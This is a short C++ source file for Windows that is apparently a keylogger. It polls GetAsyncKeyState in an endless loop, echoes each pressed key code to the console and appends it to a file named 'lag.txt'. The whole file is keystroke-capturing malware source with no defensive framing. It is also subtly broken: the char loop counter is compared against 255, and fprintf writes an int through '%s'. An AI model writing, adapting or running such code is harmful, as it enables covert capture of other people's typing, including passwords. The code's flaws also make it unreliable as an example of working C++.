#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file);


int main(){
    char i;
    while(true){
        for(i=8;i<=255;i++){
            //used to say that if  BUTTON HAS BEEN PRESSED
            if(GetAsyncKeyState(i) == -32767){
                Save(i,"lag.txt");
            }
        }
    }
    return 0;

}

int Save(int _key, char *file){
    cout<<_key<<endl;

    FILE *OUTPUTF;
    OUTPUTF = fopen(file, "a+");
    fprintf(OUTPUTF, "%s", &_key);
    fclose(OUTPUTF);
    return 0;
}